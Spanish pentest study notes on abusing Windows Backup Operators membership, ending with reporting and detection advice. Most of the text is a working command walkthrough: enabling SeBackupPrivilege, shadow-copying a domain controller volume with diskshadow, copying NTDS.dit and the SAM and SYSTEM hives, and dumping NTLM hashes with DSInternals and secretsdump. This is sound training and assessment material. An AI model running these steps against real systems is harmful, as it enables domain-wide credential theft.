# Privilegios de Grupos Windows



## Grupos incorporados en Windows

* Windows incluye varios **grupos incorporados** (built-in) que existen desde Server 2008 R2 en adelante (excepto *Hyper-V Administrators*, introducido en 2012).
* Al instalar Active Directory Domain Services en un servidor (promoverlo a Domain Controller) se agregan grupos adicionales con privilegios especiales.
* **Importante en una evaluación:** comprobar membresías innecesarias o excesivas en estos grupos y anexar la lista de miembros en el informe.

**Grupos a revisar:**

* [Backup Operators](https://learn.microsoft.com/es-es/windows-server/identity/ad-ds/manage/understand-security-groups#bkmk-backupoperators)
* [Event Log Readers](https://learn.microsoft.com/es-es/windows-server/identity/ad-ds/manage/understand-security-groups#bkmk-eventlogreaders)
* [DnsAdmins](https://learn.microsoft.com/es-es/windows-server/identity/ad-ds/manage/understand-security-groups#bkmk-dnsadmins)
* [Hyper-V Administrators](https://learn.microsoft.com/es-es/windows-server/identity/ad-ds/manage/understand-security-groups#bkmk-hypervadministrators)
* [Print Operators](https://learn.microsoft.com/es-es/windows-server/identity/ad-ds/manage/understand-security-groups#bkmk-printoperators)
* [Server Operators](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-groups#bkmk-serveroperators)

> *Nota:* los administradores de backup u otras cuentas de servicio suelen añadirse para delegar tareas (backups, impresión, DNS). A veces quedan por error.
> Siempre debemos revisar estos grupos e incluir una lista de los miembros de cada uno como apéndice en nuestro informe para que el cliente la revise y determine si el acceso sigue siendo necesario.

[Grupos de Windows](https://ss64.com/nt/syntax-security_groups.html)

[Cuentas y grupos con privilegios en AD](https://learn.microsoft.com/es-es/windows-server/identity/ad-ds/plan/security-best-practices/appendix-b--privileged-accounts-and-groups-in-active-directory)


[Asignación de derechos de usuario](https://learn.microsoft.com/es-es/previous-versions/windows/it-pro/windows-10/security/threat-protection/security-policy-settings/user-rights-assignment)

---

## Backup Operators

### Privilegios

* Miembros del grupo **Backup Operators** reciben los privilegios **SeBackupPrivilege** y **SeRestorePrivilege**.
* [**SeBackupPrivilege**](https://learn.microsoft.com/es-es/windows-hardware/drivers/ifs/privileges) permite *recorrer* cualquier carpeta y leer contenido para fines de backup, **ignorando** las ACE normales del ACL —pero no mediante comandos de copia estándar sin tratar la semántica de backup.

`Nota`: [SeBackupPrivilege doc](https://learn.microsoft.com/es-es/previous-versions/windows/it-pro/windows-10/security/threat-protection/security-policy-settings/back-up-files-and-directories)

### Limitaciones y matices

* No siempre basta el `copy`/`type`/`cat`; es necesario usar APIs/flags que respeten *backup semantics*, por ejemplo [`FILE_FLAG_BACKUP_SEMANTICS`](https://learn.microsoft.com/es-es/windows/win32/api/fileapi/nf-fileapi-createfilea).
* Si existe una entrada explícita *Deny* en la ACL para el usuario/grupo, esta prevalecerá y bloqueará el acceso aun con el privilegio de backup.
* En algunos servidores puede ser necesario un **símbolo del sistema elevado** (bypass UAC) para activar/usar el privilegio.

---

Tras acceder a una máquina, podemos mostrar nuestra pertenencia actual a los grupos usando el comando:
```powershell
whoami /groups
```

En el siguiente ejemplo examinaremos el caso que pertenecemos al grupo `Backup Operators`.

## Herramientas y PoC: activar y explotar SeBackupPrivilege

[PoC](https://github.com/giuliano108/SeBackupPrivilege)

### Importar módulos PowerShell

```powershell
Import-Module .\SeBackupPrivilegeUtils.dll
Import-Module .\SeBackupPrivilegeCmdLets.dll
```

### Verificar privilegios

```powershell
whoami /priv
# o usando el cmdlet
Get-SeBackupPrivilege
```

Salida:

```
SeBackupPrivilege             Back up files and directories  Disabled
SeRestorePrivilege           Restore files and directories  Disabled
SeChangeNotifyPrivilege      Bypass traverse checking       Enabled
```

### Habilitar SeBackupPrivilege

```powershell
Set-SeBackupPrivilege
Get-SeBackupPrivilege
SeBackupPrivilege is enabled
```

> **Nota:** Según la configuración del servidor, es posible que sea necesario generar un símbolo del sistema elevado para omitir el UAC y tener este privilegio.

---

## Copiar un archivo protegido usando el privilegio

### Escenario: no puedo hacer `cat` pero sí puedo copiar con el PoC

```powershell
dir C:\Confidential\

    Directory: C:\Confidential

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----         5/6/2021   1:01 PM             88 2021 Contract.txt

cat 'C:\Confidential\2021 Contract.txt' 

cat : Access to the path 'C:\Confidential\2021 Contract.txt' is denied.
At line:1 char:1
+ cat 'C:\Confidential\2021 Contract.txt'
+ ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
    + CategoryInfo          : PermissionDenied: (C:\Confidential\2021 Contract.txt:String) [Get-Content], Unauthor
   izedAccessException
    + FullyQualifiedErrorId : GetContentReaderUnauthorizedAccessError,Microsoft.PowerShell.Commands.GetContentCommand

Copy-FileSeBackupPrivilege 'C:\Confidential\2021 Contract.txt' .\Contract.txt
Copied 88 bytes
cat .\Contract.txt
Inlanefreight 2021 Contract

==============================

Board of Directors:

<...SNIP...>
```

**Explicación:** `Copy-FileSeBackupPrivilege` abre el archivo protegido usando la semántica de backup (ej.: `BackupRead` / `FILE_FLAG_BACKUP_SEMANTICS`), lo lee pese a la DACL original y escribe un nuevo archivo en la ruta destino. El nuevo fichero es creado por el proceso atacante y, por defecto, su propietario será el token que realizó la copia. El ownership y las ACL del archivo original no se modifican.

---

## Atacar un Domain Controller — objetivo: NTDS.dit

### NTDS.dit 

* Contiene la base de datos de Active Directory con hashes NTLM de cuentas de dominio (usuarios, equipos, krbtgt, etc.).
* Acceder a este archivo permite extraer credenciales y escalar completamente en el dominio.

### NTDS.dit está bloqueado en uso

* El archivo está bloqueado por el sistema mientras AD está funcionando. Solución: crear un **shadow copy** del volumen y exponerlo.

### Usando DiskShadow para exponer la copia

Utilizamos [`diskshadow.exe`](https://learn.microsoft.com/es-es/windows-server/administration/windows-commands/diskshadow):

```
PS C:\htb> diskshadow.exe
DISKSHADOW> set verbose on
DISKSHADOW> set metadata C:\Windows\Temp\meta.cab
DISKSHADOW> set context clientaccessible
DISKSHADOW> set context persistent
DISKSHADOW> begin backup
DISKSHADOW> add volume C: alias cdrive
DISKSHADOW> create
DISKSHADOW> expose %cdrive% E:
DISKSHADOW> end backup
DISKSHADOW> exit
```

Luego `dir E:\` mostrará la estructura de la copia y el archivo `E:\Windows\NTDS\ntds.dit` será legible:

```
    Directory: E:\


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-----         5/6/2021   1:00 PM                Confidential
d-----        9/15/2018  12:19 AM                PerfLogs
d-r---        3/24/2021   6:20 PM                Program Files
d-----        9/15/2018   2:06 AM                Program Files (x86)
d-----         5/6/2021   1:05 PM                Tools
d-r---         5/6/2021  12:51 PM                Users
d-----        3/24/2021   6:38 PM                Windows
```

---

## Copiar NTDS.dit desde la shadow copy

Utilizamos el PoC para omitir la ACL y copiar NTDS.dit localmente:

```powershell
PS C:\htb> Copy-FileSeBackupPrivilege E:\Windows\NTDS\ntds.dit C:\Tools\ntds.dit
Copied 16777216 bytes
```

### Alternativa: usar `robocopy` en modo backup

```cmd
C:\htb> robocopy /B E:\Windows\NTDS .\ntds ntds.dit
```

* La opción `/B` (backup mode) permite leer archivos con la semántica de backup.
* `robocopy` es conveniente porque ya viene en Windows y evita herramientas externas.

---

## Hacer backup de las colmenas del registro (SAM y SYSTEM)

* Con privilegios de backup podemos guardar las colmenas y analizarlas offline.

```cmd
C:\htb> reg save HKLM\SYSTEM SYSTEM.SAV
C:\htb> reg save HKLM\SAM SAM.SAV
```

* Esto permite, por ejemplo, usar `secretsdump.py` o módulos PowerShell para extraer hashes.

---

## Extraer credenciales desde NTDS.dit (offline)

### Usando DSInternals (PowerShell)

```powershell
PS C:\htb> Import-Module .\DSInternals.psd1
PS C:\htb> $key = Get-BootKey -SystemHivePath .\SYSTEM
PS C:\htb> Get-ADDBAccount -DistinguishedName 'CN=Administrator,CN=Users,DC=inlanefreight,DC=local' -DBPath .\ntds.dit -BootKey $key
# Muestra NTHash, Kerberos keys, etc.
```

### Usando Impacket `secretsdump.py` (offline)

```bash
$ secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL
```

* Output: lista en formato `user:rid:lmhash:nthash`.
* Con los hashes se puede realizar **pass-the-hash** o cracking offline (Hashcat) para obtener contraseñas en texto.

---

## Recomendaciones para un informe de seguridad (post-explotación)

* **Documentar cada paso**: comandos ejecutados, módulos usados, timestamps, archivos leídos/copied.
* **Incluir apéndice** con la **lista de miembros de cada grupo sensible** (ej.: Backup Operators, Domain Admins, etc.).
* **Riesgos:** dejar shadow copies expuestos o backups locales puede causar fuga de datos; revertir/excluir snapshots si el cliente lo solicita.
* **Acciones destructivas:** ciertas operaciones (exposición de VSS, modificaciones en el service state) pueden dañinar o afectar disponibilidad; obtener consentimiento.
* **Reversión:** siempre intentar revertir permisos/propiedades/ownership si se modificaron; si no es posible, notificar y documentar en el informe.

---

## Buenas prácticas de detección y mitigación 

* Limitar miembros de grupos privilegiados: aplicar principio de *least privilege*.
* Monitorizar uso de privilegios sensibles y eventos relacionados (Event IDs: p. ej. 4672 para privilegios especiales, 1102 para event log cleared, etc.).
* Proteger y auditar cuentas de servicio: evitar añadir cuentas de alto privilegio innecesarias.
* Habilitar control de acceso y alertas cuando se crean/exponen shadow copies o cuando `vssadmin`, `diskshadow` o `robocopy /B` se usan en servidores críticos.
* Restringir acceso a la consola local de Domain Controllers (MFA, control físico y bastionado).
